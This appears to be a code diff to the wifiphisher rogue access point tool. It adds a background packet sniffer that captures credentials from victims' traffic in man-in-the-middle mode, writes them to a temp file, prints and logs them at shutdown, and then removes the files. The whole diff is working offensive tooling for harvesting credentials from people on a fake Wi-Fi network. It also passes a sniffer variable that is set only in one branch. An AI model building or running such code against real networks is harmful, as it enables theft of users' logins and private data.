@@ -33,6 +33,7 @@ import wifiphisher.common.phishingpage as phishingpage
 import wifiphisher.common.recon as recon
 import wifiphisher.common.tui as tui
 import wifiphisher.common.victim as victim
+import wifiphisher.common.sniffer as sniffer
 
 from six.moves import range, input
 
@@ -336,6 +337,7 @@ class WifiphisherEngine:
         self.em = extensions.ExtensionManager(self.network_manager)
         self.opmode = opmode.OpMode()
         self.victim = victim.Victims()
+        self.sn = sniffer.Sniffer()
 
     def stop(self):
         if DEV:
@@ -346,6 +348,13 @@ class WifiphisherEngine:
         for cred in phishinghttp.creds:
             logger.info("Credentials: %s", cred)
             print(cred)
+        
+        if os.path.isfile('/tmp/wifiphisher-credentials.txt'):
+            print("[" + G + "+" + W + "] Credentials captured from the sniffer module:")
+            with open('/tmp/wifiphisher-credentials.txt','r') as capturedcreds:
+                credentials=capturedcreds.read()
+                logger.info("Credentials captured from the sniffer: %s", credentials)
+                print(credentials)
 
         # EM depends on Network Manager.
         # It has to shutdown first.
@@ -359,8 +368,11 @@ class WifiphisherEngine:
         self.template_manager.on_exit()
         self.fw.on_exit()
 
-        if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
-            os.remove('/tmp/wifiphisher-webserver.tmp')
+        if os.path.isfile('/tmp/wifiphisher-http-requests.txt'):
+            os.remove('/tmp/wifiphisher-http-requests.txt')
+
+        if os.path.isfile('/tmp/wifiphisher-credentials.txt'):
+            os.remove('/tmp/wifiphisher-credentials.txt')
 
         print('[' + R + '!' + W + '] Closing')
         sys.exit(0)
@@ -738,6 +750,13 @@ class WifiphisherEngine:
             webserver.start()
 
             time.sleep(1.5)
+        
+        elif self.opmode.internet_sharing_enabled() and args.mitminterface:
+            # Start the packet sniffer asynchronously in the background
+            print('[' + T + '*' + W + '] Starting sniffing traffic on interface ' + 
+                internet_interface)
+            pktSniffer = sniffer.AsyncSniffer(iface=internet_interface, prn=self.sn.pkt_parser, store=0)
+            time.sleep(1.5)
 
         # We no longer need mac_matcher
         self.mac_matcher.unbind()
@@ -748,7 +767,7 @@ class WifiphisherEngine:
         # Main loop.
         try:
             main_info = tui.MainInfo(VERSION, essid, channel, ap_iface,
-                                     self.em, phishinghttp, args)
+                                     self.em, phishinghttp, args, template, pktSniffer)
             tui_main_object = tui.TuiMain()
             curses.wrapper(tui_main_object.gather_info, main_info)
             self.stop()
